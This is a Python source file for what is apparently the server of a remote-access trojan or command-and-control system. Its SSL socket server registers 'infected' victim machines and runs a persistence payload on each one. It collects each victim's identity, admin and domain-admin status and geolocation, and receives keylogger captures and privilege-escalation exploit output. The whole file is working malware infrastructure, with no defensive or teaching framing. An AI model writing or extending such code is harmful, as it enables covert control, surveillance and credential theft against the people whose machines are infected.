import asyncio
import ssl
from datetime import datetime
from classes.user import User
from classes.agent import Agent
from dataManager.dataManager import DataManager
from dataManager.repository.userRepository import UserRepository
import logging
from modules.KeyloggerModule import KeyloggerModule
from modules.Recognizer import Recognizer
from modules.ExploitModule import ExploitModule
from app_state import AppState


class SocketServer:
    def __init__(self, app_state: AppState, host="0.0.0.0", port=4242, certfile='certs/cert.pem', keyfile='certs/key.pem', lock: asyncio.Lock = None):
        self.host = host
        self.port = port
        self.data_manager: DataManager = app_state.data_manager
        self.user_repository: UserRepository = self.data_manager.user_repository
        self.certfile = certfile
        self.keyfile = keyfile
        self.lock = app_state.lock
        self.recognizer = self.data_manager.recognizer_module
        self.keylogger = self.data_manager.keylogger_module
        self.exploit_module = self.data_manager.exploit_module
        self.agent_module = self.data_manager.agent_module

    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        ip, port = writer.get_extra_info('peername')

        try:
            data = await reader.read(4096)
            if not data:
                logging.info(f"Connection closed by {ip}")
                return

            logging.info("Received data from " + ip + " : " + data.decode())
            service, uuid, params = data.decode().split("|||")

            message = await self.route(service, uuid, params, reader, writer, ip, port)

            if message == "[close]":
                writer.close()
                await writer.wait_closed()
        except Exception as e:
            logging.error(f"Error handling client {ip}: {e}")

    async def monitor_socket(self, user: User):
        """
        Monitors the socket for closure and logs out the user when closed.
        """
        while True:
            await asyncio.sleep(5)  # Check every 5 seconds
            if user.reader.at_eof() or user.writer.is_closing():
                logging.info(f"Connection closed for user {user.uuid}")
                user.connection_time.append({
                    "event": "logout",
                    "timestamp": datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
                })
                # Save updated user data
                self.user_repository.save_user(user)
                break

    async def route(self, service, uuid, params, reader, writer, ip, port):
        if service == "infected":
            logging.info(f"New infection vector: {uuid}")
            if uuid in [x["logged"] for x in self.user_repository.get_user_list()]:
                writer.write("exit".encode())
                return "[close]"

            user = self.user_repository.get_user(uuid)
            if not user:
                user = User(uuid, ip, port, reader, writer, agent_module=self.agent_module)
                self.user_repository.add_user(user)
            else:
                user.ip = ip
                user.port = port
                user.reader = reader
                user.writer = writer
                user.agent_module = self.agent_module

            await user.execute("./modules/payloads/payload_persistence.py")
            user.connection_time.append({
                "event": "login",
                "timestamp": datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")
            })
            user.first_name, user.last_name, user.username, user.is_admin, user.is_domain_admin, user.domain_name, user.machine_name = (await self.recognizer.get_user_infos(reader, writer)).values()
            user.longitude, user.latitude, user.city, user.region, user.country = (await self.recognizer.get_user_position(reader, writer)).values()
            user.start_not_running_watchers()

            # Save user data and start monitoring socket state
            self.user_repository.save_user(user)
            asyncio.create_task(self.monitor_socket(user))

        elif service == "agent":
            user = self.user_repository.get_user(uuid)
            pid = params
            if not user.is_logged_in():
                user.reader = reader
                user.writer = writer
            agent = Agent(reader, writer, user, pid)
            logging.info(f"Agent {uuid} with pid {pid} connected: {user.first_name} {user.last_name} ({user.username})")

            await agent.handle()
            return "[close]"
        elif service == "keylogger":
            await self.keylogger.action(params, uuid)
            return "[close]"
        elif service == "peas":
            await self.exploit_module.peas_receive_socket(params, uuid)
            return "[close]"
        else:
            logging.error(f"Unknown service: {service}")

    async def start(self):
        # Create an SSL context
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)

        # Start the server with SSL
        server = await asyncio.start_server(
            self.handle_client, self.host, self.port, ssl=ssl_context
        )
        addr = server.sockets[0].getsockname()
        logging.info(f"Serveur SSL en écoute sur {addr}\n")

        async with server:
            await server.serve_forever()
